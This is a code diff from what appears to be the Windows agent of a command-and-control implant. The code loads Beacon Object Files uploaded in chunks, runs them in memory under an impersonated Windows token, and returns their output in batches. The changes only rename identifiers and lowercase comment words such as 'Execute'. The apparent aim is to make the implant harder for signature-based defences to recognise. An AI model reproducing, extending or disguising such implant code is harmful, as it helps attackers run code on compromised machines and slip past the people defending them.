@@ -195,7 +195,7 @@ func executeBOFWithTokenContext(bofBytes []byte, args []byte) (string, error) {
 
 		// Also disconnect all tracked resources
 		if networkResourceTracker != nil {
-			resources := networkResourceTracker.GetTrackedResources()
+			resources := networkResourceTracker.getTrackedResources()
 			for _, resource := range resources {
 				WNetCancelConnection2(resource, 0, true)
 			}
@@ -217,7 +217,7 @@ func executeBOFWithTokenContext(bofBytes []byte, args []byte) (string, error) {
 	if err != nil {
 		// DuplicateTokenEx failed -- do NOT fall back to the shared handle,
 		// as using it directly is unsafe (concurrent use / double-close).
-		// Execute without impersonation instead.
+		// execute without impersonation instead.
 		return Load(bofBytes, args)
 	}
 	// We duplicated the token, so we need to close it later
@@ -230,7 +230,7 @@ func executeBOFWithTokenContext(bofBytes []byte, args []byte) (string, error) {
 		return Load(bofBytes, args)
 	}
 
-	// Execute BOF with token context
+	// execute BOF with token context
 	output, execErr := Load(bofBytes, args)
 
 	// IMPORTANT: Always revert impersonation after BOF execution
@@ -259,7 +259,7 @@ func executeBOFPlatformAsync(bofBytes []byte, args []byte) (string, error) {
 }
 
 // processBOF is the Windows-specific implementation
-func (cq *CommandQueue) processBOF(cmd Command) CommandResult {
+func (cq *WorkQueue) processBOF(cmd Msg) OpResult {
 	// Handle multi-chunk BOF file uploads first
 	if cmd.TotalChunks > 1 && cmd.Data != "" {
 		return cq.handleChunkedBOF(cmd)
@@ -303,12 +303,12 @@ func (cq *CommandQueue) processBOF(cmd Command) CommandResult {
 	// Decode the BOF data from base64
 	bofBytes, err := base64.StdEncoding.DecodeString(bofData)
 	if err != nil {
-		return CommandResult{
-			Command:     cmd,
+		return OpResult{
+			Cmd:     cmd,
 			Output:      Err(E18),
 			Error:       err,
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -342,7 +342,7 @@ func (cq *CommandQueue) processBOF(cmd Command) CommandResult {
 		}
 	}
 
-	// Execute the BOF (token context is handled inside executeBOFPlatform)
+	// execute the BOF (token context is handled inside executeBOFPlatform)
 	output, err := executeBOFPlatform(bofBytes, bofArgs)
 
 	// IMPORTANT: Clear the Filename field for BOF results
@@ -359,27 +359,27 @@ func (cq *CommandQueue) processBOF(cmd Command) CommandResult {
 		totalChunks := len(chunks)
 
 		// Batch chunks together to reduce database operations
-		batchedResults := make([]*CommandResult, 0)
+		batchedResults := make([]*OpResult, 0)
 
 		for i, chunk := range chunks {
-			chunkResult := &CommandResult{
-				Command: Command{
-					Command:      resultCmd.Command,
-					CommandID:    resultCmd.CommandID,
-					CommandDBID:  resultCmd.CommandDBID,
-					AgentID:      resultCmd.AgentID,
+			chunkResult := &OpResult{
+				Cmd: Msg{
+					Cmd:      resultCmd.Cmd,
+					CID:    resultCmd.CID,
+					DID:  resultCmd.DID,
+					AID:      resultCmd.AID,
 					CurrentChunk: i + 1,
 					TotalChunks:  totalChunks,
 				},
 				Output:      fmt.Sprintf("C%d/%d\n%s", i+1, totalChunks, chunk),
-				ExitCode:    0,
-				CompletedAt: time.Now().Format(time.RFC3339),
+				EC:    0,
+				Done: time.Now().Format(time.RFC3339),
 			}
 
 			if err != nil {
 				chunkResult.Error = err
-				chunkResult.ErrorString = Err(E25)
-				chunkResult.ExitCode = 1
+				chunkResult.EStr = Err(E25)
+				chunkResult.EC = 1
 				if i == 0 {
 					chunkResult.Output = ErrCtx(E25, chunk)
 				}
@@ -391,7 +391,7 @@ func (cq *CommandQueue) processBOF(cmd Command) CommandResult {
 			if len(batchedResults) >= MAX_CHUNKS_PER_BATCH || i == len(chunks)-1 {
 				// Add all batched results at once
 				for _, result := range batchedResults {
-					if err := resultManager.AddResult(result); err != nil {
+					if err := resultManager.addResult(result); err != nil {
 					}
 				}
 
@@ -404,36 +404,36 @@ func (cq *CommandQueue) processBOF(cmd Command) CommandResult {
 			}
 		}
 
-		return CommandResult{
-			Command:     resultCmd,
+		return OpResult{
+			Cmd:     resultCmd,
 			Output:      SuccCtx(S5, fmt.Sprintf("%d/%d", outputLen, totalChunks)),
-			ExitCode:    0,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    0,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	// Output is small enough to send as one piece
 	if err != nil {
-		return CommandResult{
-			Command:     resultCmd,
+		return OpResult{
+			Cmd:     resultCmd,
 			Output:      ErrCtx(E25, output),
 			Error:       err,
-			ErrorString: Err(E25),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EStr: Err(E25),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
-	return CommandResult{
-		Command:     resultCmd,
+	return OpResult{
+		Cmd:     resultCmd,
 		Output:      output,
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
-// BOFChunkInfo tracks chunked BOF uploads
-type BOFChunkInfo struct {
+// ChunkMeta tracks chunked BOF uploads
+type ChunkMeta struct {
 	Filename     string
 	TotalChunks  int
 	Chunks       map[int]string // chunk number -> base64 data
@@ -445,7 +445,7 @@ type BOFChunkInfo struct {
 const bofChunkStaleTimeout = 5 * time.Minute
 
 var (
-	bofChunks      = make(map[string]*BOFChunkInfo) // commandID -> chunk info
+	bofChunks      = make(map[string]*ChunkMeta) // commandID -> chunk info
 	bofChunksMutex sync.Mutex
 )
 
@@ -461,7 +461,7 @@ func cleanupStaleBOFChunks() {
 }
 
 // handleChunkedBOF handles multi-chunk BOF uploads
-func (cq *CommandQueue) handleChunkedBOF(cmd Command) CommandResult {
+func (cq *WorkQueue) handleChunkedBOF(cmd Msg) OpResult {
 	bofChunksMutex.Lock()
 	defer bofChunksMutex.Unlock()
 
@@ -470,16 +470,16 @@ func (cq *CommandQueue) handleChunkedBOF(cmd Command) CommandResult {
 
 	// Get or create chunk info
 	now := time.Now()
-	chunkInfo, exists := bofChunks[cmd.CommandID]
+	chunkInfo, exists := bofChunks[cmd.CID]
 	if !exists {
-		chunkInfo = &BOFChunkInfo{
+		chunkInfo = &ChunkMeta{
 			Filename:     cmd.Filename,
 			TotalChunks:  cmd.TotalChunks,
 			Chunks:       make(map[int]string),
 			ReceivedAt:   now,
 			LastAccessed: now,
 		}
-		bofChunks[cmd.CommandID] = chunkInfo
+		bofChunks[cmd.CID] = chunkInfo
 	} else {
 		chunkInfo.LastAccessed = now
 	}
@@ -522,11 +522,11 @@ func (cq *CommandQueue) handleChunkedBOF(cmd Command) CommandResult {
 
 	// Check if all chunks received
 	if len(chunkInfo.Chunks) < cmd.TotalChunks {
-		return CommandResult{
-			Command:     cmd,
+		return OpResult{
+			Cmd:     cmd,
 			Output:      SuccCtx(S0, fmt.Sprintf("%d/%d", cmd.CurrentChunk+1, cmd.TotalChunks)),
-			ExitCode:    0,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    0,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -537,11 +537,11 @@ func (cq *CommandQueue) handleChunkedBOF(cmd Command) CommandResult {
 	for i := 0; i < cmd.TotalChunks; i++ {
 		chunk, ok := chunkInfo.Chunks[i]
 		if !ok {
-			return CommandResult{
-				Command:     cmd,
+			return OpResult{
+				Cmd:     cmd,
 				Output:      ErrCtx(E24, fmt.Sprintf("%d", i)),
-				ExitCode:    1,
-				CompletedAt: time.Now().Format(time.RFC3339),
+				EC:    1,
+				Done: time.Now().Format(time.RFC3339),
 			}
 		}
 		fullData.WriteString(chunk)
@@ -551,7 +551,7 @@ func (cq *CommandQueue) handleChunkedBOF(cmd Command) CommandResult {
 	storedArgs := chunkInfo.Arguments
 
 	// Clean up chunk storage
-	delete(bofChunks, cmd.CommandID)
+	delete(bofChunks, cmd.CID)
 
 	// Update the command with the reassembled data and arguments
 	cmd.Data = fullData.String()
@@ -564,7 +564,7 @@ func (cq *CommandQueue) handleChunkedBOF(cmd Command) CommandResult {
 }
 
 // handleChunkedBOFAsync handles multi-chunk async BOF uploads
-func (cq *CommandQueue) handleChunkedBOFAsync(cmd Command) CommandResult {
+func (cq *WorkQueue) handleChunkedBOFAsync(cmd Msg) OpResult {
 	bofChunksMutex.Lock()
 	defer bofChunksMutex.Unlock()
 
@@ -572,16 +572,16 @@ func (cq *CommandQueue) handleChunkedBOFAsync(cmd Command) CommandResult {
 	cleanupStaleBOFChunks()
 
 	now := time.Now()
-	chunkInfo, exists := bofChunks[cmd.CommandID]
+	chunkInfo, exists := bofChunks[cmd.CID]
 	if !exists {
-		chunkInfo = &BOFChunkInfo{
+		chunkInfo = &ChunkMeta{
 			Filename:     cmd.Filename,
 			TotalChunks:  cmd.TotalChunks,
 			Chunks:       make(map[int]string),
 			ReceivedAt:   now,
 			LastAccessed: now,
 		}
-		bofChunks[cmd.CommandID] = chunkInfo
+		bofChunks[cmd.CID] = chunkInfo
 	} else {
 		chunkInfo.LastAccessed = now
 	}
@@ -621,11 +621,11 @@ func (cq *CommandQueue) handleChunkedBOFAsync(cmd Command) CommandResult {
 
 
 	if len(chunkInfo.Chunks) < cmd.TotalChunks {
-		return CommandResult{
-			Command:     cmd,
+		return OpResult{
+			Cmd:     cmd,
 			Output:      SuccCtx(S0, fmt.Sprintf("%d/%d", cmd.CurrentChunk+1, cmd.TotalChunks)),
-			ExitCode:    0,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    0,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -634,11 +634,11 @@ func (cq *CommandQueue) handleChunkedBOFAsync(cmd Command) CommandResult {
 	for i := 0; i < cmd.TotalChunks; i++ {
 		chunk, ok := chunkInfo.Chunks[i]
 		if !ok {
-			return CommandResult{
-				Command:     cmd,
+			return OpResult{
+				Cmd:     cmd,
 				Output:      ErrCtx(E24, fmt.Sprintf("%d", i)),
-				ExitCode:    1,
-				CompletedAt: time.Now().Format(time.RFC3339),
+				EC:    1,
+				Done: time.Now().Format(time.RFC3339),
 			}
 		}
 		fullData.WriteString(chunk)
@@ -647,18 +647,18 @@ func (cq *CommandQueue) handleChunkedBOFAsync(cmd Command) CommandResult {
 	// Store arguments before cleaning up
 	storedArgs := chunkInfo.Arguments
 
-	delete(bofChunks, cmd.CommandID)
+	delete(bofChunks, cmd.CID)
 
 	// Decode BOF
 	bofBytes, err := base64.StdEncoding.DecodeString(fullData.String())
 	if err != nil {
-		return CommandResult{
-			Command:     cmd,
+		return OpResult{
+			Cmd:     cmd,
 			Output:      Err(E18),
 			Error:       err,
-			ErrorString: Err(E18),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EStr: Err(E18),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -671,6 +671,6 @@ func (cq *CommandQueue) handleChunkedBOFAsync(cmd Command) CommandResult {
 		}
 	}
 
-	// Execute async (token context will be captured in executeBOFAsyncPlatform)
+	// execute async (token context will be captured in executeBOFAsyncPlatform)
 	return executeBOFAsyncPlatform(cmd, bofBytes, bofArgs)
 }
